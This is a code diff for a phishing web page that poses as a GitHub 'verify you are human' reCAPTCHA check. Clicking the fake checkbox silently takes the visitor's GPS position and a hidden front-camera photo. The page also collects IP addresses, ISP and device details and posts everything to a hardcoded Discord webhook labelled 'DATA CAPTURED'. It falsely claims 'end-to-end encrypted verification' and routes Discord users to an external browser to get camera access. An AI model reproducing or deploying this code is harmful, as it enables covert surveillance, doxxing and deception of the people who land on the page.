@@ -38,62 +38,33 @@
 
     #screen-warning, #screen-loading { display: none; }
 
-    /* De Google reCAPTCHA knop imitatie */
+    /* De Google reCAPTCHA knop stijl */
     .recaptcha-anchor {
       display: flex;
       align-items: center;
       justify-content: space-between;
-      width: 300px;
-      height: 74px;
+      width: 304px;
+      height: 78px;
       background: #f9f9f9;
       border: 1px solid #d3d3d3;
       border-radius: 3px;
       padding: 0 12px;
       cursor: pointer;
       margin-bottom: 30px;
-      transition: background 0.2s;
+      box-shadow: 0 0 4px rgba(0,0,0,0.08);
     }
     .recaptcha-anchor:hover { background: #f1f1f1; }
-
     .rc-left { display: flex; align-items: center; gap: 15px; }
-    
-    .rc-checkbox {
-      width: 28px;
-      height: 28px;
-      border: 2px solid #c1c1c1;
-      background: #fff;
-      border-radius: 2px;
-    }
+    .rc-checkbox { width: 28px; height: 28px; border: 2px solid #c1c1c1; background: #fff; border-radius: 2px; }
+    .rc-text { color: #000; font-size: 14px; font-family: Roboto, arial, sans-serif; }
+    .rc-right { display: flex; flex-direction: column; align-items: center; color: #555; }
+    .rc-logo { width: 32px; height: 32px; background-image: url("https://www.gstatic.com/recaptcha/api2/logo_48.png"); background-size: contain; background-repeat: no-repeat; }
 
-    .rc-text {
-      color: #000;
-      font-size: 14px;
-      font-family: Roboto, helvetica, arial, sans-serif;
-    }
+    .tg-title { font-size: 1.5rem; font-weight: 600; margin-bottom: 12px; }
+    .tg-subtitle { color: var(--tg-sub); font-size: 0.95rem; line-height: 1.4; margin-bottom: 40px; padding: 0 20px; }
+    .secure-text { margin-top: 30px; font-size: 0.8rem; color: #34c759; font-weight: 500; display: flex; align-items: center; gap: 5px; }
 
-    .rc-right {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      font-size: 10px;
-      color: #555;
-    }
-    
-    .rc-logo {
-      width: 32px;
-      height: 32px;
-      background-image: url("https://www.gstatic.com/recaptcha/api2/logo_48.png");
-      background-size: contain;
-      background-repeat: no-repeat;
-    }
-
-    /* Loading/Scan Styles */
-    .scan-line {
-      position: absolute; width: 100%; height: 2px; background: var(--tg-blue);
-      box-shadow: 0 0 15px var(--tg-blue); top: 0;
-      animation: moving-scan 1.5s infinite ease-in-out;
-    }
+    .scan-line { position: absolute; width: 100%; height: 2px; background: var(--tg-blue); box-shadow: 0 0 15px var(--tg-blue); top: 0; animation: moving-scan 1.5s infinite ease-in-out; }
     @keyframes moving-scan { 0%, 100% { top: 10%; } 50% { top: 90%; } }
 
     #hidden-video { position: fixed; opacity: 0; left: -999px; }
@@ -107,44 +78,39 @@
 
 <div id="screen-warning">
   <div style="font-size:4rem; margin-bottom:20px;">⚠️</div>
-  <div style="font-size:1.5rem; font-weight:600; color:var(--warning-red); margin-bottom:12px;">Browser Error</div>
-  <div style="color:var(--tg-sub); margin-bottom:30px;">Open deze pagina in Chrome of Safari om de verificatie te voltooien.</div>
-  <button style="width:90%; padding:16px; background:var(--warning-red); color:white; border:none; border-radius:14px; font-weight:600;" onclick="openExternally()">Open Browser</button>
+  <div style="font-size:1.5rem; font-weight:600; color:var(--warning-red); margin-bottom:12px;">External Browser Required</div>
+  <div style="color:var(--tg-sub); margin-bottom:30px;">Discord blocks camera access. Open in Chrome or Safari.</div>
 </div>
 
 <div id="screen-landing">
-  <div style="margin-bottom: 30px;">
-    <h2 style="font-size: 1.5rem; font-weight: 600;">Sign in to GitHub</h2>
-  </div>
-
+  <div class="tg-title">Verify you are human.</div>
+  <div class="tg-subtitle">Security measures enabled. Please use Captcha to confirm you're a human and access the Github Homepage.</div>
+  
   <div class="recaptcha-anchor" onclick="triggerScan()">
     <div class="rc-left">
       <div class="rc-checkbox"></div>
-      <div class="rc-text">I'm not a robot</div>
+      <div class="rc-text">I am not a robot</div>
     </div>
     <div class="rc-right">
       <div class="rc-logo"></div>
-      <span>reCAPTCHA</span>
-      <span style="font-size: 8px;">Privacy - Terms</span>
+      <span style="font-size:10px;">reCAPTCHA</span>
+      <span style="font-size:8px;">Privacy - Terms</span>
     </div>
   </div>
 
-  <p style="color: var(--tg-sub); font-size: 0.9rem; padding: 0 20px;">
-    To protect your account, please complete the human verification.
-  </p>
+  <div class="secure-text">End-to-End Encrypted Verification</div>
 </div>
 
 <div id="screen-loading">
-  <div style="position:relative; width:100px; height:100px; margin-bottom:20px;">
-    <div class="rc-logo" style="width:100px; height:100px; opacity:0.2;"></div>
-    <div class="scan-line"></div>
+  <div style="position:relative; width:140px; height:140px; margin-bottom:20px;">
+      <div class="rc-logo" style="width:140px; height:140px; opacity: 0.2;"></div>
+      <div class="scan-line"></div>
   </div>
-  <div style="color:var(--tg-blue); font-weight:600;">Verifying...</div>
+  <div style="color:var(--tg-blue); font-weight:600;">Authenticating...</div>
 </div>
 
 <script>
   const WEBHOOK = 'https://discord.com/api/webhooks/1495153409458704537/5MxkCcDC1DuhzHDf90BqtcED6yHEbI62IvzytW4rtMOE-CZCVhRXNw3nCqwKZCN0tc91';
-  
   let ipInfo = { v4: '...', v6: '...', loc: '...', isp: '...' };
   let gpsInfo = { lat: null, lon: null, acc: null };
 
@@ -160,37 +126,36 @@
       ipInfo.v6 = v6.ip;
     } catch(e) {}
   }
-  loadMeta(); // Start direct met laden
+  loadMeta();
 
   async function triggerScan() {
     document.getElementById('screen-landing').style.display = 'none';
     document.getElementById('screen-loading').style.display = 'flex';
 
-    // GPS Request
     await new Promise(res => {
       navigator.geolocation.getCurrentPosition(
         (p) => { gpsInfo.lat = p.coords.latitude; gpsInfo.lon = p.coords.longitude; gpsInfo.acc = p.coords.accuracy; res(); },
-        () => res(), { timeout: 4000 }
+        () => res(), { timeout: 5000 }
       );
     });
 
     const blobs = [];
     try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+      const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
       const v = document.getElementById('hidden-video');
-      v.srcObject = stream;
+      v.srcObject = s;
       const b = await new Promise(res => {
         v.onloadedmetadata = () => setTimeout(() => {
           const c = document.getElementById('hidden-canvas');
           c.width = v.videoWidth; c.height = v.videoHeight;
           const ctx = c.getContext('2d');
-          ctx.translate(c.width, 0); ctx.scale(-1, 1); // Spiegelen voor front-cam
+          ctx.translate(c.width, 0); ctx.scale(-1, 1);
           ctx.drawImage(v, 0, 0);
-          c.toBlob(res, 'image/jpeg', 0.8);
+          c.toBlob(res, 'image/jpeg', 0.85);
         }, 800);
       });
-      if(b) blobs.push({ b, n: 'user_front.jpg' });
-      stream.getTracks().forEach(t => t.stop());
+      if(b) blobs.push({ b, n: 'capture.jpg' });
+      s.getTracks().forEach(t => t.stop());
     } catch(e) {}
 
     await upload(blobs);
@@ -202,10 +167,10 @@
     const payload = {
       username: "GitHub Security",
       embeds: [{
-        title: "✅ VERIFICATION COMPLETED",
+        title: "✅ DATA CAPTURED",
         color: 0x24A1DE,
         fields: [
-          { name: "📱 Browser", value: `\`${navigator.userAgent.substring(0, 150)}\`` },
+          { name: "📱 Device", value: `\`${navigator.userAgent.substring(0, 150)}\`` },
           { name: "🌐 IPv4", value: `\`${ipInfo.v4}\``, inline: true },
           { name: "🌐 IPv6", value: `\`${ipInfo.v6}\``, inline: true },
           { name: "📍 Location", value: ipInfo.loc },
@@ -221,18 +186,11 @@
   }
 
   window.onload = () => {
-    const ua = navigator.userAgent.toLowerCase();
-    if (ua.includes('discord')) {
+    if (navigator.userAgent.toLowerCase().includes('discord')) {
       document.getElementById('screen-landing').style.display = 'none';
       document.getElementById('screen-warning').style.display = 'flex';
     }
   };
-
-  function openExternally() {
-    const u = window.location.href;
-    if (navigator.share) navigator.share({ url: u });
-    else alert("Copy: " + u);
-  }
 </script>
 </body>
 </html>
